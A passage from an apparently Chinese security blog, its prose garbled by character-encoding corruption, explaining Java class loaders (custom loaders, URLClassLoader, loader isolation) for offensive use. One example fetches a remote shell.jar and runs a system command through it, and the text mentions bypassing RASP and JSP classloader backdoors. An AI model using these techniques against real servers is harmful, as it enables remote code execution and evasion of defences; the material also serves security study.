punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> newLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token class-name">Object</span> testInstance <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token class-name">Object</span> invokeValue <span class="token operator">=</span> testInstance<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>testInstance<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>invokeValue<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>åˆ©ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨æˆ‘ä»¬å¯ä»¥åœ¨ webshell ä¸­å®ç°åŠ è½½å¹¶è°ƒç”¨è‡ªå·±ç¼–è¯‘çš„ç±»å¯¹è±¡ï¼Œæ¯”å¦‚æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´è°ƒç”¨è‡ªå®šä¹‰ç±»å­—èŠ‚ç çš„ native æ–¹æ³•ç»•è¿‡ RASP æ£€æµ‹ï¼Œä¹Ÿå¯ä»¥ç”¨äºåŠ å¯†é‡è¦çš„ Java ç±»å­—èŠ‚ç ï¼ˆåªèƒ½ç®—å¼±åŠ å¯†äº†ï¼‰</p><h1 id="urlclassloader"><a class="anchor" href="#urlclassloader">#</a> URLClassLoader</h1><p><code>URLClassLoader</code> ç»§æ‰¿äº† <code>ClassLoader</code> ï¼Œ <code>URLClassLoader</code> æä¾›äº†åŠ è½½è¿œç¨‹èµ„æºçš„èƒ½åŠ›ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„ <code>payload</code> æˆ–è€… <code>webshell</code> çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ¥åŠ è½½è¿œç¨‹çš„ jar æ¥å®ç°è¿œç¨‹çš„ç±»æ–¹æ³•è°ƒç”¨</p><ul><li>è¿œç¨‹ jar ä¸­çš„ Shell ç±»</li></ul><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shell</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">Shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Process</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">return</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><ul><li>è¿œç¨‹è°ƒç”¨</li></ul><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>liangc<span class="token punctuation">.</span>classloader</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URLTest</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token comment">// å®šä¹‰è¿œç¨‹åŠ è½½çš„ jar è·¯å¾„</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://192.168.226.1/shell.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token comment">// åˆ›å»º URLClassLoader å¯¹è±¡ï¼Œå¹¶åŠ è½½è¿œç¨‹ jar åŒ…</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token class-name">URLClassLoader</span> ucl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token comment">// å®šä¹‰éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"net user"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token comment">// é€šè¿‡ URLClassLoader åŠ è½½è¿œç¨‹ jar åŒ…ä¸­çš„ CMD ç±»</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cmdClass <span class="token operator">=</span> ucl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"Shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token class-name">Process</span> process <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Process</span><span class="token punctuation">)</span> cmdClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token comment">// è·å–å‘½ä»¤æ‰§è¡Œç»“æœçš„è¾“å…¥æµ</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token class-name">InputStream</span> in   <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span>                b    <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token keyword">int</span>                   a    <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token comment">// è¯»å–å‘½ä»¤æ‰§è¡Œç»“æœ</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token comment">// è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ</span></pre></td></tr><tr><td data-num="36"></td><td><pre>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h1 id="ç±»åŠ è½½éš”ç¦»"><a class="anchor" href="#ç±»åŠ è½½éš”ç¦»">#</a> ç±»åŠ è½½éš”ç¦»</h1><p>åˆ›å»ºç±»åŠ è½½å™¨çš„æ—¶å€™å¯ä»¥æŒ‡å®šè¯¥ç±»åŠ è½½çš„çˆ¶ç±»åŠ è½½å™¨ï¼ŒClassLoader æ˜¯æœ‰éš”ç¦»æœºåˆ¶çš„ï¼Œä¸åŒçš„ ClassLoader å¯ä»¥åŠ è½½ç›¸åŒçš„ Classï¼ˆä¸¤è€…å¿…é¡»æ˜¯éç»§æ‰¿å…³ç³»ï¼‰ï¼ŒåŒçº§ ClassLoader è·¨ç±»åŠ è½½å™¨è°ƒç”¨æ–¹æ³•æ—¶å¿…é¡»ä½¿ç”¨åå°„</p><p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20230716105252659.png" title="image-20230716105252659"></p><h2 id="è·¨ç±»åŠ è½½å™¨åŠ è½½"><a class="anchor" href="#è·¨ç±»åŠ è½½å™¨åŠ è½½">#</a> è·¨ç±»åŠ è½½å™¨åŠ è½½</h2><p>RASP å’Œ IAST ç»å¸¸ä¼šç”¨åˆ°è·¨ç±»åŠ è½½å™¨åŠ è½½ç±»çš„æƒ…å†µï¼Œå› ä¸º RASP/IAST ä¼šåœ¨ä»»æ„å¯èƒ½å­˜åœ¨å®‰å…¨é£é™©çš„ç±»ä¸­æ’å…¥æ£€æµ‹ä»£ç ï¼Œå› æ­¤å¿…é¡»å¾—ä¿è¯ RASP/IAST çš„ç±»èƒ½å¤Ÿè¢«æ’å…¥çš„ç±»æ‰€ä½¿ç”¨çš„ç±»åŠ è½½æ­£ç¡®åŠ è½½ï¼Œå¦åˆ™å°±ä¼šå‡ºç° ClassNotFoundException</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œè·¨ç±»åŠ è½½å™¨è°ƒç”¨ç±»æ–¹æ³•æ—¶éœ€è¦ç‰¹åˆ«æ³¨æ„ä¸€ä¸ªåŸºæœ¬åŸåˆ™ï¼š <code>ClassLoader A</code> å’Œ <code>ClassLoader B</code> å¯ä»¥åŠ è½½ç›¸åŒç±»åçš„ç±»ï¼Œä½†æ˜¯ <code>ClassLoader A</code> ä¸­çš„ <code>Class A</code> å’Œ <code>ClassLoader B</code> ä¸­çš„ <code>Class A</code> æ˜¯å®Œå…¨ä¸åŒçš„å¯¹è±¡ï¼Œä¸¤è€…ä¹‹é—´è°ƒç”¨åªèƒ½é€šè¿‡åå°„</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>liangc<span class="token punctuation">.</span>classloader</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">com<span class="token punctuation">.</span>liangc<span class="token punctuation">.</span>classloader<span class="token punctuation">.</span></span><span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token static">className</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">com<span class="token punctuation">.</span>liangc<span class="token punctuation">.</span>classloader<span class="token punctuation">.</span></span><span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token static">classContent</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestCrossLoader</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderA</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">public</span> <span class="token class-name">ClassLoaderA</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token comment">// åŠ è½½ç±»å­—èŠ‚ç </span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token function">defineClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> classContent<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classContent<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderB</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">public</span> <span class="token class-name">ClassLoaderB</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token comment">// åŠ è½½ç±»å­—èŠ‚ç </span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token function">defineClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> classContent<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classContent<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token comment">// çˆ¶ç±»åŠ è½½å™¨</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token class-name">ClassLoader</span> parentClassLoader <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token comment">// A ç±»åŠ è½½å™¨</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token class-name">ClassLoaderA</span> aClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassLoaderA</span><span class="token punctuation">(</span>parentClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token comment">// B ç±»åŠ è½½å™¨</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token class-name">ClassLoaderB</span> bClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassLoaderB</span><span class="token punctuation">(</span>parentClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token comment">// ä½¿ç”¨ A/B ç±»åŠ è½½å™¨åŠ è½½åŒä¸€ä¸ªç±»</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass  <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> aClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aaClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> aClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> bClass  <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> bClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token comment">// æ¯”è¾ƒ A ç±»åŠ è½½å’Œ B ç±»åŠ è½½å™¨åŠ è½½çš„ç±»æ˜¯å¦ç›¸ç­‰</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"aClass == aaClassï¼š"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>aClass <span class="token operator">==</span> aaClass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"aClass == bClassï¼š"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>aClass <span class="token operator">==</span> bClass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> aClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"æ–¹æ³•æ¸…å•ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token comment">// è·å–è¯¥ç±»æ‰€æœ‰æ–¹æ³•</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method <span class="token operator">:</span> methods<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="62"></td><td><pre></pre></td></tr><tr><td data-num="63"></td><td><pre>        <span class="token comment">// åˆ›å»ºç±»å®ä¾‹</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        <span class="token class-name">Object</span> instanceA <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre></pre></td></tr><tr><td data-num="66"></td><td><pre>        <span class="token comment">// è·å– test æ–¹æ³•</span></pre></td></tr><tr><td data-num="67"></td><td><pre>        <span class="token class-name">Method</span> helloMethod <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre></pre></td></tr><tr><td data-num="69"></td><td><pre>        <span class="token comment">// è°ƒç”¨ hello æ–¹æ³•</span></pre></td></tr><tr><td data-num="70"></td><td><pre>        <span class="token class-name">String</span> result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> helloMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>instanceA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre></pre></td></tr><tr><td data-num="72"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\nåå°„è°ƒç”¨ï¼š"</span> <span class="token operator">+</span> className <span class="token operator">+</span> <span class="token string">"ç±»"</span> <span class="token operator">+</span> helloMethod<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"æ–¹æ³•ï¼Œè¿”å›ç»“æœï¼š"</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="74"></td><td><pre></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h1 id="jsp-è‡ªå®šä¹‰ç±»åŠ è½½åé—¨"><a class="anchor" href="#jsp-è‡ªå®šä¹‰ç±»åŠ è½½åé—¨">#</a> JSP è‡ªå®šä¹‰ç±»åŠ è½½åé—¨</h1><p><code>å†°è</code> çš„ JSP 